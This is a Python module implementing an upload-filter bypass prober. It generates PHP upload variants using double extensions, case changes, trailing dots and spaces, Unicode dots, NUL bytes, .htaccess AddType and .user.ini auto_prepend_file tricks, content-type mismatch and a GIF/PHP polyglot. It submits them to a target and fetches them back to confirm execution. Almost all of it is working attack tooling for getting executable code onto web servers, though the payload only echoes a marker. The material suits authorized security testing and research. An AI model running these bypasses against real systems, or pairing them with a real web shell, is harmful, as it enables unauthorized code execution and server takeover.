"""Upload filter bypass prober: filename variants, multipart parts and retrievability."""

from __future__ import annotations

import copy
import hashlib
import threading
from dataclasses import dataclass
from typing import Any, Callable, Mapping
from urllib.parse import unquote, urljoin, urlparse, urlunparse


class UploadError(ValueError):
    """Raised when an upload probe is refused or malformed."""

    def __init__(self, code: str, detail: Any = None) -> None:
        super().__init__(code)
        self.code = code
        self.detail = detail


@dataclass(frozen=True)
class Variant:
    variant_id: str
    kind: str
    filename: str
    content_type: str
    magic: bytes
    payload: bytes
    executable: bool
    notes: str


@dataclass(frozen=True)
class UploadPart:
    filename: str
    content_type: str
    body: bytes
    boundary: str


@dataclass(frozen=True)
class SubmitResult:
    target: str
    variant_id: str
    status: int
    url: str
    stored_path: str | None
    headers: tuple[tuple[str, str], ...]


@dataclass(frozen=True)
class BypassVerdict:
    variant_id: str
    status: str
    reason: str
    evidence: Mapping[str, Any]


class UploadBypassProber:
    """Build upload variants and decide whether a stored file is retrievable as code."""

    KINDS = (
        "double_ext",
        "uppercase",
        "trailing_dot",
        "trailing_space",
        "unicode",
        "null_byte",
        "htaccess",
        "user_ini",
        "ct_mismatch",
        "polyglot",
    )
    SNAPSHOT_KEYS = frozenset({"version", "submissions", "verdicts", "stats"})
    EXEC_MARK = "UPLOAD_EXEC_MARK"
    SNAPSHOT_VERSION = 1

    _REJECTED_UPLOAD_STATUSES = frozenset({400, 413, 415})
    _BLOCKED_FETCH_STATUSES = frozenset({400, 404, 410, 413, 415})
    _WAF_FETCH_STATUSES = frozenset({401, 403, 407, 429})
    _PHP_CODE = b'<?php echo "UPLOAD_EXEC_MARK"; ?>'

    def __init__(
        self,
        *,
        transport: Callable[[str, UploadPart], Any],
        max_uploads_per_target: int = 8,
        max_bytes: int = 2_000_000,
        max_variants: int = 12,
    ) -> None:
        if not callable(transport):
            raise UploadError("UPLOAD_INVALID_REQUEST", "transport must be callable")
        for name, value in (
            ("max_uploads_per_target", max_uploads_per_target),
            ("max_bytes", max_bytes),
            ("max_variants", max_variants),
        ):
            if isinstance(value, bool) or not isinstance(value, int) or value < 0:
                raise UploadError("UPLOAD_INVALID_REQUEST", f"{name} must be non-negative")

        self._transport = transport
        self.max_uploads_per_target = max_uploads_per_target
        self.max_bytes = max_bytes
        self.max_variants = max_variants
        self._lock = threading.RLock()
        self._target_locks: dict[str, threading.RLock] = {}
        self._submissions: dict[str, list[SubmitResult]] = {}
        self._verdicts: list[BypassVerdict] = []
        self._stats = self._empty_stats()
        self._variants: dict[str, Variant] = {}

    @staticmethod
    def _empty_stats() -> dict[str, int]:
        return {"uploads": 0, "judgements": 0, "bypass": 0, "blocked": 0}

    def plan(self, base_name: str = "shell", *, kinds: tuple[str, ...] | None = None) -> tuple[Variant, ...]:
        self._validate_base_name(base_name)
        if kinds is None:
            selected = self.KINDS
        else:
            if isinstance(kinds, (str, bytes)):
                raise UploadError("UPLOAD_INVALID_REQUEST", "kinds must be an iterable of strings")
            try:
                requested = tuple(kinds)
            except TypeError as exc:
                raise UploadError(
                    "UPLOAD_INVALID_REQUEST", "kinds must be an iterable of strings"
                ) from exc
            if any(not isinstance(kind, str) or kind not in self.KINDS for kind in requested):
                raise UploadError("UPLOAD_INVALID_REQUEST", "unknown variant kind")
            wanted = set(requested)
            selected = tuple(kind for kind in self.KINDS if kind in wanted)

        variants = tuple(
            self._make_variant(base_name, kind)
            for kind in selected[: self.max_variants]
        )
        with self._lock:
            for variant in variants:
                self._variants[variant.variant_id] = variant
        return variants

    def build_part(self, variant: Variant) -> UploadPart:
        if not isinstance(variant, Variant) or variant.kind not in self.KINDS:
            raise UploadError("UPLOAD_VARIANT_UNKNOWN", getattr(variant, "kind", None))
        if not variant.filename or not isinstance(variant.content_type, str):
            raise UploadError("UPLOAD_VARIANT_UNKNOWN", variant.variant_id)
        if not isinstance(variant.payload, bytes):
            raise UploadError("UPLOAD_VARIANT_UNKNOWN", variant.variant_id)

        digest = hashlib.sha256(
            variant.variant_id.encode("utf-8", "replace")
            + b"\x00"
            + variant.filename.encode("utf-8", "replace")
            + b"\x00"
            + variant.payload
        ).hexdigest()
        boundary = "----UploadBypassProber" + digest[:32]
        filename = variant.filename
        prefix = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: {variant.content_type}\r\n"
            "\r\n"
        ).encode("utf-8")
        suffix = f"\r\n--{boundary}--\r\n".encode("ascii")
        return UploadPart(
            filename=variant.filename,
            content_type=variant.content_type,
            body=prefix + variant.payload + suffix,
            boundary=boundary,
        )

    def submit(self, target: str, variant: Variant) -> SubmitResult:
        self._validate_target(target)
        if not isinstance(variant, Variant) or variant.kind not in self.KINDS:
            raise UploadError("UPLOAD_VARIANT_UNKNOWN", getattr(variant, "kind", None))
        if not isinstance(variant.payload, bytes):
            raise UploadError("UPLOAD_VARIANT_UNKNOWN", variant.variant_id)
        if len(variant.payload) > self.max_bytes:
            raise UploadError(
                "UPLOAD_LIMIT_EXCEEDED",
                {"limit": "max_bytes", "value": len(variant.payload), "max": self.max_bytes},
            )

        with self._target_lock(target):
            with self._lock:
                uploads = len(self._submissions.get(target, ()))
            if uploads >= self.max_uploads_per_target:
                raise UploadError(
                    "UPLOAD_LIMIT_EXCEEDED",
                    {
                        "limit": "max_uploads_per_target",
                        "value": uploads,
                        "max": self.max_uploads_per_target,
                    },
                )

            part = self.build_part(variant)
            try:
                response = self._transport(target, part)
            except UploadError:
                raise
            except Exception as exc:
                raise UploadError("UPLOAD_TRANSPORT_ERROR", exc) from exc

            result = self._submit_result(target, variant, response)
            with self._lock:
                self._submissions.setdefault(target, []).append(result)
                self._stats["uploads"] += 1
                self._variants[variant.variant_id] = variant
            return result

    def judge(self, submission: SubmitResult, *, fetch: Callable[[str], Any] | None = None) -> BypassVerdict:
        if not isinstance(submission, SubmitResult):
            raise UploadError("UPLOAD_INVALID_REQUEST", "submission must be SubmitResult")
        self._validate_target(submission.target)
        if not isinstance(submission.variant_id, str) or not submission.variant_id:
            raise UploadError("UPLOAD_INVALID_REQUEST", "submission variant_id")
        if isinstance(submission.status, bool) or not isinstance(submission.status, int):
            raise UploadError("UPLOAD_INVALID_REQUEST", "submission status")
        if not isinstance(submission.url, str):
            raise UploadError("UPLOAD_INVALID_REQUEST", "submission url")
        if submission.stored_path is not None and not isinstance(submission.stored_path, str):
            raise UploadError("UPLOAD_INVALID_REQUEST", "submission stored_path")

        with self._target_lock(submission.target):
            verdict = self._judge_locked(submission, fetch)
            with self._lock:
                self._verdicts.append(copy.deepcopy(verdict))
                self._stats["judgements"] += 1
                if verdict.status in ("bypass", "blocked"):
                    self._stats[verdict.status] += 1
            return verdict

    def report(self) -> dict:
        with self._lock:
            targets = tuple(sorted(self._submissions))
            submissions = sum(len(items) for items in self._submissions.values())
            counts = {"bypass": 0, "partial": 0, "blocked": 0, "inconclusive": 0}
            bypass: list[str] = []
            for verdict in self._verdicts:
                if verdict.status in counts:
                    counts[verdict.status] += 1
                if verdict.status == "bypass":
                    bypass.append(verdict.variant_id)
        return {
            "targets": targets,
            "submissions": submissions,
            "counts": counts,
            "bypass": tuple(bypass),
        }

    def snapshot(self) -> dict:
        with self._lock:
            return {
                "version": self.SNAPSHOT_VERSION,
                "submissions": copy.deepcopy(self._submissions),
                "verdicts": copy.deepcopy(self._verdicts),
                "stats": copy.deepcopy(self._stats),
            }

    def restore(self, state: dict) -> None:
        try:
            restored = self._validated_restore_state(state)
        except Exception as exc:
            if isinstance(exc, UploadError):
                raise
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", exc) from exc

        with self._lock:
            self._submissions = restored["submissions"]
            self._verdicts = restored["verdicts"]
            self._stats = restored["stats"]
            self._variants.clear()

    def stats(self) -> dict:
        with self._lock:
            return dict(self._stats)

    def submissions_for(self, target: str) -> tuple[SubmitResult, ...]:
        with self._lock:
            return tuple(self._submissions.get(target, ()))

    def reset(self) -> None:
        with self._lock:
            self._submissions.clear()
            self._verdicts.clear()
            self._stats = self._empty_stats()
            self._variants.clear()

    @staticmethod
    def _validate_base_name(base_name: str) -> None:
        if not isinstance(base_name, str):
            raise UploadError("UPLOAD_INVALID_REQUEST", "base_name must be a string")
        if not base_name.strip():
            raise UploadError("UPLOAD_INVALID_REQUEST", "base_name is empty")
        if any(char in base_name for char in ("/", "\\", "\x00", "\r", "\n")):
            raise UploadError("UPLOAD_INVALID_REQUEST", "base_name contains a path separator")

    @staticmethod
    def _validate_target(target: str) -> None:
        if not isinstance(target, str) or not target or target != target.strip():
            raise UploadError("UPLOAD_INVALID_REQUEST", "target must be a non-empty string")
        if "\x00" in target:
            raise UploadError("UPLOAD_INVALID_REQUEST", "target contains NUL")

    def _target_lock(self, target: str) -> threading.RLock:
        with self._lock:
            return self._target_locks.setdefault(target, threading.RLock())

    def _make_variant(self, base_name: str, kind: str) -> Variant:
        if kind == "double_ext":
            filename = f"{base_name}.php.jpg"
            content_type = "image/jpeg"
            magic = b"<?php "
            payload = self._PHP_CODE
            executable = True
            notes = "PHP extension hidden behind an image extension"
        elif kind == "uppercase":
            filename = f"{base_name}.PHP"
            content_type = "application/x-php"
            magic = b"<?php "
            payload = self._PHP_CODE
            executable = True
            notes = "Executable extension in uppercase"
        elif kind == "trailing_dot":
            filename = f"{base_name}.php."
            content_type = "application/octet-stream"
            magic = b"<?php "
            payload = self._PHP_CODE
            executable = True
            notes = "Executable extension followed by a trailing dot"
        elif kind == "trailing_space":
            filename = f"{base_name}.php "
            content_type = "application/octet-stream"
            magic = b"<?php "
            payload = self._PHP_CODE
            executable = True
            notes = "Executable extension followed by a trailing space"
        elif kind == "unicode":
            filename = f"{base_name}\uff0ephp"
            content_type = "application/octet-stream"
            magic = b"<?php "
            payload = self._PHP_CODE
            executable = True
            notes = "Full-width dot before the executable extension"
        elif kind == "null_byte":
            filename = f"{base_name}.php\x00.jpg"
            content_type = "image/jpeg"
            magic = b"<?php "
            payload = self._PHP_CODE
            executable = True
            notes = "NUL byte hides the executable extension"
        elif kind == "htaccess":
            filename = ".htaccess"
            content_type = "text/plain"
            magic = b"AddType "
            payload = b"AddType application/x-httpd-php .jpg\n"
            executable = True
            notes = "Apache directory configuration"
        elif kind == "user_ini":
            filename = ".user.ini"
            content_type = "text/plain"
            magic = b"auto_prepend_file="
            payload = b"auto_prepend_file=shell.php\n"
            executable = True
            notes = "PHP per-directory configuration"
        elif kind == "ct_mismatch":
            filename = f"{base_name}.jpg"
            content_type = "application/x-php"
            magic = b"<?php "
            payload = self._PHP_CODE
            executable = True
            notes = "PHP content announced as an executable media type"
        elif kind == "polyglot":
            filename = f"{base_name}.jpg"
            content_type = "image/jpeg"
            magic = b"GIF89a"
            payload = magic + self._PHP_CODE
            executable = False
            notes = "GIF magic bytes followed by PHP code"
        else:  # pragma: no cover - protected by KINDS
            raise UploadError("UPLOAD_VARIANT_UNKNOWN", kind)

        return Variant(
            variant_id=f"{kind}@{base_name}",
            kind=kind,
            filename=filename,
            content_type=content_type,
            magic=magic,
            payload=payload,
            executable=executable,
            notes=notes,
        )

    def _submit_result(self, target: str, variant: Variant, response: Any) -> SubmitResult:
        status_value = self._response_value(response, ("status", "status_code", "code"), 0)
        try:
            status = int(status_value)
        except (TypeError, ValueError):
            status = 0

        headers = self._normalise_headers(self._response_value(response, ("headers",), {}))
        header_map = dict(headers)
        raw_url = self._response_value(response, ("url", "access_url", "location"), "")
        if not raw_url:
            raw_url = header_map.get("location", "")
        url = self._as_text(raw_url)
        url = self._absolute_url(target, url) if url else ""

        stored_path = self._response_value(
            response, ("stored_path", "storage_path", "file_path", "path"), None
        )
        if stored_path is None:
            stored_path = header_map.get("x-stored-path") or header_map.get("x-storage-path")
        if stored_path is not None:
            stored_path = self._as_text(stored_path)

        return SubmitResult(
            target=target,
            variant_id=variant.variant_id,
            status=status,
            url=url,
            stored_path=stored_path,
            headers=headers,
        )

    @staticmethod
    def _response_value(response: Any, names: tuple[str, ...], default: Any) -> Any:
        if response is None:
            return default
        if isinstance(response, Mapping):
            for name in names:
                if name in response:
                    return response[name]
            return default
        for name in names:
            if hasattr(response, name):
                return getattr(response, name)
        return default

    @classmethod
    def _normalise_headers(cls, headers: Any) -> tuple[tuple[str, str], ...]:
        if headers is None:
            return ()
        items: list[tuple[Any, Any]]
        if isinstance(headers, Mapping):
            items = list(headers.items())
        else:
            try:
                items = list(headers)
            except TypeError:
                return ()
        normalised: list[tuple[str, str]] = []
        for item in items:
            if not isinstance(item, (tuple, list)) or len(item) != 2:
                continue
            name, value = item
            normalised.append((cls._as_text(name).lower(), cls._as_text(value)))
        return tuple(normalised)

    @staticmethod
    def _absolute_url(target: str, url: str) -> str:
        url = url.strip()
        if not url:
            return ""
        parsed = urlparse(url)
        if parsed.scheme:
            return url
        return urljoin(target, url)

    def _judge_locked(
        self, submission: SubmitResult, fetch: Callable[[str], Any] | None
    ) -> BypassVerdict:
        evidence: dict[str, Any] = {
            "url": submission.url,
            "upload_url": submission.url,
            "stored_path": submission.stored_path,
            "upload_status": submission.status,
            "headers": dict(submission.headers),
        }
        status = submission.status

        if status in self._REJECTED_UPLOAD_STATUSES:
            return BypassVerdict(submission.variant_id, "blocked", "rejected", evidence)
        if status in (401, 403) or status == 407 or status == 429:
            return BypassVerdict(submission.variant_id, "inconclusive", "waf_block", evidence)
        if 500 <= status <= 599:
            return BypassVerdict(submission.variant_id, "inconclusive", "server_error", evidence)
        if not 200 <= status <= 299:
            return BypassVerdict(submission.variant_id, "inconclusive", "unexpected_status", evidence)

        retrieval_url = submission.url.strip()
        if not retrieval_url and submission.stored_path:
            retrieval_url = self._retrieval_url_from_path(submission.target, submission.stored_path)
        retrieval_url = self._absolute_url(submission.target, retrieval_url)
        evidence["url"] = retrieval_url

        if fetch is None or not callable(fetch):
            return BypassVerdict(submission.variant_id, "inconclusive", "unverified", evidence)
        if not retrieval_url:
            return BypassVerdict(submission.variant_id, "inconclusive", "unverified", evidence)

        try:
            page = fetch(retrieval_url)
        except UploadError as exc:
            evidence["error"] = {"code": exc.code, "detail": exc.detail}
            return BypassVerdict(submission.variant_id, "inconclusive", "fetch_error", evidence)
        except Exception as exc:
            evidence["error"] = repr(exc)
            return BypassVerdict(submission.variant_id, "inconclusive", "fetch_error", evidence)

        if page is None:
            evidence["error"] = "empty fetch response"
            return BypassVerdict(submission.variant_id, "inconclusive", "fetch_error", evidence)

        if isinstance(page, (bytes, bytearray, memoryview, str)):
            fetched_status = 200
            fetched_headers: tuple[tuple[str, str], ...] = ()
            body = page
        else:
            fetched_status_value = self._response_value(
                page, ("status", "status_code", "code"), 200
            )
            try:
                fetched_status = int(fetched_status_value)
            except (TypeError, ValueError):
                fetched_status = 0
            fetched_headers = self._normalise_headers(
                self._response_value(page, ("headers",), {})
            )
            body = self._response_value(page, ("body", "content", "data", "text"), b"")
        body_bytes = self._as_bytes(body)
        evidence["fetch_status"] = fetched_status
        evidence["fetch_headers"] = dict(fetched_headers)
        evidence["body_length"] = len(body_bytes)

        if fetched_status in (404, 410):
            return BypassVerdict(submission.variant_id, "blocked", "not_reachable", evidence)
        if fetched_status in self._BLOCKED_FETCH_STATUSES:
            return BypassVerdict(submission.variant_id, "blocked", "rejected", evidence)
        if fetched_status in self._WAF_FETCH_STATUSES:
            return BypassVerdict(submission.variant_id, "inconclusive", "waf_block", evidence)
        if 500 <= fetched_status <= 599:
            return BypassVerdict(submission.variant_id, "inconclusive", "server_error", evidence)
        if not 200 <= fetched_status <= 299:
            return BypassVerdict(submission.variant_id, "inconclusive", "unexpected_status", evidence)

        marker = self.EXEC_MARK.encode("ascii")
        marker_found = marker in body_bytes
        against_payload = self._matches_uploaded_payload(submission, body_bytes)
        source_exposed = against_payload or (
            b"<?php" in body_bytes.lower() and marker_found
        )
        evidence["marker_found"] = marker_found
        evidence["source_exposed"] = source_exposed

        stored_path = (submission.stored_path or "").strip()
        if marker_found and not source_exposed:
            if not stored_path:
                return BypassVerdict(submission.variant_id, "partial", "missing_storage_path", evidence)
            return BypassVerdict(submission.variant_id, "bypass", "executed", evidence)

        if not stored_path:
            return BypassVerdict(submission.variant_id, "inconclusive", "unverified", evidence)

        if self._is_image_magic_variant(submission.variant_id) and (
            self._is_php_target(submission.stored_path)
            and self._is_php_target(retrieval_url)
        ):
            return BypassVerdict(
                submission.variant_id, "partial", "execution_not_observed", evidence
            )

        return BypassVerdict(submission.variant_id, "blocked", "not_executed", evidence)

    def _matches_uploaded_payload(self, submission: SubmitResult, body: bytes) -> bool:
        with self._lock:
            variant = self._variants.get(submission.variant_id)
        if variant is None:
            return False
        payload = variant.payload
        if not payload:
            return False
        return body == payload or payload in body

    def _is_image_magic_variant(self, variant_id: str) -> bool:
        kind = variant_id.split("@", 1)[0]
        if kind in {"double_ext", "null_byte", "polyglot"}:
            return True
        with self._lock:
            variant = self._variants.get(variant_id)
        if variant is None:
            return False
        return variant.magic.startswith((b"GIF87a", b"GIF89a", b"\xff\xd8\xff", b"\x89PNG"))

    @staticmethod
    def _is_php_target(path: str | None) -> bool:
        if not path:
            return False
        decoded = unquote(path).lower()
        parsed = urlparse(decoded)
        candidate = parsed.path if parsed.scheme or parsed.netloc else decoded
        candidate = candidate.replace("\\", "/").rstrip("/")
        name = candidate.rsplit("/", 1)[-1]
        if "\x00" in name:
            name = name.split("\x00", 1)[0]
        name = name.rstrip(" .")
        return name.endswith(".php")

    @staticmethod
    def _retrieval_url_from_path(target: str, stored_path: str) -> str:
        name = unquote(stored_path).replace("\\", "/").rstrip("/").rsplit("/", 1)[-1]
        if not name:
            return ""
        parsed = urlparse(target)
        if parsed.scheme and parsed.netloc:
            return urlunparse((parsed.scheme, parsed.netloc, "/" + name, "", "", ""))
        return urljoin(target, name)

    @staticmethod
    def _as_bytes(value: Any) -> bytes:
        if value is None:
            return b""
        if isinstance(value, bytes):
            return value
        if isinstance(value, bytearray):
            return bytes(value)
        if isinstance(value, memoryview):
            return value.tobytes()
        if isinstance(value, str):
            return value.encode("utf-8", "replace")
        return str(value).encode("utf-8", "replace")

    @staticmethod
    def _as_text(value: Any) -> str:
        if value is None:
            return ""
        if isinstance(value, bytes):
            return value.decode("utf-8", "replace")
        if isinstance(value, bytearray):
            return bytes(value).decode("utf-8", "replace")
        if isinstance(value, memoryview):
            return value.tobytes().decode("utf-8", "replace")
        return str(value)

    def _validated_restore_state(self, state: Any) -> dict[str, Any]:
        if not isinstance(state, Mapping) or set(state) != self.SNAPSHOT_KEYS:
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "snapshot shape")
        version = state.get("version")
        if isinstance(version, bool) or not isinstance(version, int) or version != self.SNAPSHOT_VERSION:
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "snapshot version")
        if not isinstance(state.get("submissions"), Mapping):
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "submissions")
        if not isinstance(state.get("verdicts"), (list, tuple)):
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "verdicts")
        if not isinstance(state.get("stats"), Mapping):
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "stats")

        submissions: dict[str, list[SubmitResult]] = {}
        for target, items in state["submissions"].items():
            if not isinstance(target, str) or not target or not isinstance(items, (list, tuple)):
                raise UploadError("UPLOAD_SNAPSHOT_INVALID", "submission target")
            restored_items: list[SubmitResult] = []
            for item in items:
                self._validate_submit_result(item)
                restored_items.append(copy.deepcopy(item))
            submissions[target] = restored_items

        verdicts: list[BypassVerdict] = []
        for verdict in state["verdicts"]:
            if not isinstance(verdict, BypassVerdict):
                raise UploadError("UPLOAD_SNAPSHOT_INVALID", "verdict")
            if not isinstance(verdict.variant_id, str) or not verdict.variant_id:
                raise UploadError("UPLOAD_SNAPSHOT_INVALID", "verdict variant")
            if verdict.status not in {"bypass", "partial", "blocked", "inconclusive"}:
                raise UploadError("UPLOAD_SNAPSHOT_INVALID", "verdict status")
            if not isinstance(verdict.reason, str):
                raise UploadError("UPLOAD_SNAPSHOT_INVALID", "verdict reason")
            if not isinstance(verdict.evidence, Mapping):
                raise UploadError("UPLOAD_SNAPSHOT_INVALID", "verdict evidence")
            verdicts.append(copy.deepcopy(verdict))

        stats_state = state["stats"]
        required = {"uploads", "judgements", "bypass", "blocked"}
        if not required.issubset(stats_state):
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "stats keys")
        stats: dict[str, int] = {}
        for key in required:
            value = stats_state[key]
            if isinstance(value, bool) or not isinstance(value, int) or value < 0:
                raise UploadError("UPLOAD_SNAPSHOT_INVALID", "stats value")
            stats[key] = value

        return {
            "submissions": submissions,
            "verdicts": verdicts,
            "stats": stats,
        }

    @staticmethod
    def _validate_submit_result(item: Any) -> None:
        if not isinstance(item, SubmitResult):
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "submission")
        if not isinstance(item.target, str) or not item.target:
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "submission target")
        if not isinstance(item.variant_id, str) or not item.variant_id:
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "submission variant")
        if isinstance(item.status, bool) or not isinstance(item.status, int):
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "submission status")
        if not isinstance(item.url, str):
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "submission url")
        if item.stored_path is not None and not isinstance(item.stored_path, str):
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "submission stored_path")
        if not isinstance(item.headers, tuple):
            raise UploadError("UPLOAD_SNAPSHOT_INVALID", "submission headers")
        for header in item.headers:
            if not isinstance(header, tuple) or len(header) != 2:
                raise UploadError("UPLOAD_SNAPSHOT_INVALID", "submission header")
            name, value = header
            if not isinstance(name, str) or not isinstance(value, str):
                raise UploadError("UPLOAD_SNAPSHOT_INVALID", "submission header")
